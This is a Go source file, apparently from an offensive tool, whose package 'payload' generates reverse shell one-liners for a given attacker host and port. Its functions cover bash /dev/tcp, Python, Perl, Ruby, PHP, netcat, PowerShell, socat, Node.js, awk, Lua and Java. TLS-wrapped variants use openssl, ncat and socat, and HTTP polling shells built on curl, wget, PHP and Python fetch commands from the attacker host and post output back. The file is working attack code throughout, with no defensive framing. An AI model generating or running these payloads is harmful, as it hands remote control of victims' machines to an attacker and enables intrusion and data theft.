package payload

import "fmt"

// Bash returns a bash /dev/tcp reverse shell.
func Bash(lhost string, lport int) string {
	return fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", lhost, lport)
}

// BashMin returns the shortest possible bash reverse shell (uses sh).
func BashMin(lhost string, lport int) string {
	return fmt.Sprintf("sh -i >& /dev/tcp/%s/%d 0>&1", lhost, lport)
}

// BashFD returns a compact bash reverse shell using file descriptors.
func BashFD(lhost string, lport int) string {
	return fmt.Sprintf("exec 5<>/dev/tcp/%s/%d;sh <&5 >&5 2>&5", lhost, lport)
}

// BashReadLine returns a bash reverse shell using readline for a cleaner shell.
func BashReadLine(lhost string, lport int) string {
	return fmt.Sprintf("bash -l > /dev/tcp/%s/%d 0<&1 2>&1", lhost, lport)
}

// Python returns a Python3 reverse shell.
func Python(lhost string, lport int) string {
	return fmt.Sprintf(
		`python3 -c 'import socket,subprocess,os;`+
			`s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);`+
			`s.connect(("%s",%d));`+
			`os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);`+
			`subprocess.call(["/bin/sh","-i"])'`,
		lhost, lport,
	)
}

// PythonMin returns a compact Python3 reverse shell.
func PythonMin(lhost string, lport int) string {
	return fmt.Sprintf(
		`python3 -c 'import os,socket as s;c=s.socket();c.connect(("%s",%d));[os.dup2(c.fileno(),i)for i in(0,1,2)];os.system("sh")'`,
		lhost, lport,
	)
}

// PythonPTY returns a Python3 reverse shell with PTY allocation.
func PythonPTY(lhost string, lport int) string {
	return fmt.Sprintf(
		`python3 -c 'import socket,subprocess,os,pty;`+
			`s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);`+
			`s.connect(("%s",%d));`+
			`os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);`+
			`pty.spawn("/bin/bash")'`,
		lhost, lport,
	)
}

// Perl returns a Perl reverse shell.
func Perl(lhost string, lport int) string {
	return fmt.Sprintf(
		`perl -e 'use Socket;$i="%s";$p=%d;`+
			`socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));`+
			`if(connect(S,sockaddr_in($p,inet_aton($i)))){`+
			`open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");`+
			`exec("/bin/sh -i");};'`,
		lhost, lport,
	)
}

// Ruby returns a Ruby reverse shell.
func Ruby(lhost string, lport int) string {
	return fmt.Sprintf(
		`ruby -rsocket -e 'f=TCPSocket.open("%s",%d).to_i;`+
			`exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`,
		lhost, lport,
	)
}

// PHP returns a PHP reverse shell one-liner.
func PHP(lhost string, lport int) string {
	return fmt.Sprintf(
		`php -r '$sock=fsockopen("%s",%d);exec("/bin/sh -i <&3 >&3 2>&3");'`,
		lhost, lport,
	)
}

// PHPMin returns a minimal PHP reverse shell.
func PHPMin(lhost string, lport int) string {
	return fmt.Sprintf(
		`php -r '$s=fsockopen("%s",%d);shell_exec("sh<&3>&3 2>&3");'`,
		lhost, lport,
	)
}

// PHPExec returns a PHP reverse shell using proc_open.
func PHPExec(lhost string, lport int) string {
	return fmt.Sprintf(
		`php -r '$s=fsockopen("%s",%d);$p=proc_open("/bin/sh",`+
			`array(0=>$s,1=>$s,2=>$s),$pipes);'`,
		lhost, lport,
	)
}

// Netcat returns a netcat reverse shell using -e flag.
func Netcat(lhost string, lport int) string {
	return fmt.Sprintf("nc -e /bin/sh %s %d", lhost, lport)
}

// NetcatMkfifo returns a netcat reverse shell using mkfifo (no -e needed).
func NetcatMkfifo(lhost string, lport int) string {
	return fmt.Sprintf(
		"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f",
		lhost, lport,
	)
}

// NetcatOpenbsd returns a netcat reverse shell for OpenBSD netcat (no -e).
func NetcatOpenbsd(lhost string, lport int) string {
	return fmt.Sprintf(
		"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc %s %d >/tmp/f",
		lhost, lport,
	)
}

// PowerShell returns a PowerShell reverse shell for Windows.
func PowerShell(lhost string, lport int) string {
	return fmt.Sprintf(
		`powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('%s',%d);`+
			`$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};`+
			`while(($i=$s.Read($b,0,$b.Length)) -ne 0){`+
			`$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);`+
			`$r=(iex $d 2>&1|Out-String);`+
			`$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');`+
			`$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`,
		lhost, lport,
	)
}

// PowerShellConPTY returns a PowerShell reverse shell with ConPTY for full interactive shell.
func PowerShellConPTY(lhost string, lport int) string {
	return fmt.Sprintf(
		`powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('%s',%d);`+
			`$s=$c.GetStream();`+
			`$p=New-Object System.Diagnostics.Process;`+
			`$p.StartInfo.FileName='cmd.exe';`+
			`$p.StartInfo.RedirectStandardInput=$true;`+
			`$p.StartInfo.RedirectStandardOutput=$true;`+
			`$p.StartInfo.RedirectStandardError=$true;`+
			`$p.StartInfo.UseShellExecute=$false;`+
			`$p.Start();`+
			`$is=$p.StandardInput;$os=$p.StandardOutput;`+
			`Start-Sleep 1;`+
			`while(!$p.HasExited){`+
			`if($s.DataAvailable){`+
			`[byte[]]$b=0..1024|%%{0};`+
			`$i=$s.Read($b,0,$b.Length);`+
			`$is.Write([Text.Encoding]::ASCII.GetString($b,0,$i))};`+
			`if(!$os.EndOfStream){`+
			`$o=$os.ReadLine();`+
			`$sb=[Text.Encoding]::ASCII.GetBytes($o+[char]10);`+
			`$s.Write($sb,0,$sb.Length)}}"`,
		lhost, lport,
	)
}

// Java returns a Java Runtime reverse shell.
func Java(lhost string, lport int) string {
	return fmt.Sprintf(
		`java -cp . -e "Runtime r = Runtime.getRuntime();`+
			`Process p = r.exec(new String[]{\"/bin/bash\",\"-c\",`+
			`\"bash -i >& /dev/tcp/%s/%d 0>&1\"});p.waitFor();"`,
		lhost, lport,
	)
}

// Socat returns a socat reverse shell with TTY.
func Socat(lhost string, lport int) string {
	return fmt.Sprintf(
		"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%d",
		lhost, lport,
	)
}

// Lua returns a Lua reverse shell.
func Lua(lhost string, lport int) string {
	return fmt.Sprintf(
		`lua -e "require('socket');require('os');`+
			`t=socket.tcp();t:connect('%s','%d');`+
			`os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
		lhost, lport,
	)
}

// NodeJS returns a Node.js reverse shell.
func NodeJS(lhost string, lport int) string {
	return fmt.Sprintf(
		`node -e '(function(){var n=require("net"),`+
			`c=require("child_process"),`+
			`s=n.connect(%d,"%s",function(){`+
			`var p=c.spawn("/bin/sh",["-i"]);`+
			`s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s)})})();'`,
		lport, lhost,
	)
}

// Awk returns an awk reverse shell.
func Awk(lhost string, lport int) string {
	return fmt.Sprintf(
		`awk 'BEGIN{s="/inet/tcp/0/%s/%d";while(1){do{s|&getline c;`+
			`if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")}}'`,
		lhost, lport,
	)
}

// --- TLS reverse shells ---

// BashTLS returns a bash reverse shell over TLS using openssl s_client.
func BashTLS(lhost string, lport int) string {
	return fmt.Sprintf(
		"mkfifo /tmp/f;openssl s_client -quiet -connect %s:%d < /tmp/f 2>/dev/null | /bin/sh > /tmp/f 2>&1;rm /tmp/f",
		lhost, lport,
	)
}

// PythonTLS returns a Python3 reverse shell over TLS.
func PythonTLS(lhost string, lport int) string {
	return fmt.Sprintf(
		`python3 -c 'import socket,subprocess,os,ssl;`+
			`s=socket.socket();`+
			`s=ssl.wrap_socket(s);`+
			`s.connect(("%s",%d));`+
			`os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);`+
			`subprocess.call(["/bin/sh","-i"])'`,
		lhost, lport,
	)
}

// NcatTLS returns a ncat reverse shell over TLS.
func NcatTLS(lhost string, lport int) string {
	return fmt.Sprintf("ncat --ssl -e /bin/sh %s %d", lhost, lport)
}

// SocatTLS returns a socat reverse shell over TLS with TTY.
func SocatTLS(lhost string, lport int) string {
	return fmt.Sprintf(
		"socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:%s:%d,verify=0",
		lhost, lport,
	)
}

// --- WebSocket reverse shells ---

// --- HTTP reverse shells ---

// CurlHTTP returns a curl-based HTTP reverse shell (polling).
func CurlHTTP(lhost string, lport int) string {
	return fmt.Sprintf(
		`while true;do c=$(curl -s http://%s:%d/cmd);`+
			`[ -z "$c" ]&&sleep 0.2&&continue;`+
			`o=$(sh -c "$c" 2>&1);`+
			`curl -s -d "$o" http://%s:%d/out;done`,
		lhost, lport, lhost, lport,
	)
}

// WgetHTTP returns a wget-based HTTP reverse shell (polling).
func WgetHTTP(lhost string, lport int) string {
	return fmt.Sprintf(
		`while true;do c=$(wget -qO- http://%s:%d/cmd);`+
			`[ -z "$c" ]&&sleep 0.2&&continue;`+
			`o=$(sh -c "$c" 2>&1);`+
			`wget -qO- --post-data="$o" http://%s:%d/out;done`,
		lhost, lport, lhost, lport,
	)
}

// PHPHTTP returns a PHP HTTP reverse shell (polling).
func PHPHTTP(lhost string, lport int) string {
	return fmt.Sprintf(
		`php -r '$h="http://%s:%d";while(1){$c=@file_get_contents("$h/cmd");`+
			`if(!$c){usleep(200000);continue;}`+
			`$o=shell_exec($c);`+
			`$ctx=stream_context_create(["http"=>["method"=>"POST","content"=>$o]]);`+
			`@file_get_contents("$h/out",false,$ctx);}'`,
		lhost, lport,
	)
}

// PythonHTTP returns a Python3 HTTP reverse shell (polling).
func PythonHTTP(lhost string, lport int) string {
	return fmt.Sprintf(
		`python3 -c 'import urllib.request as u,subprocess as s,time;h="http://%s:%d";exec("""\nwhile 1:\n try:\n  c=u.urlopen(h+"/cmd").read().decode()\n  if not c:time.sleep(0.2);continue\n  r=s.run(c,shell=1,capture_output=1)\n  u.urlopen(u.Request(h+"/out",data=r.stdout+r.stderr))\n except:time.sleep(1)\n""")'`,
		lhost, lport,
	)
}
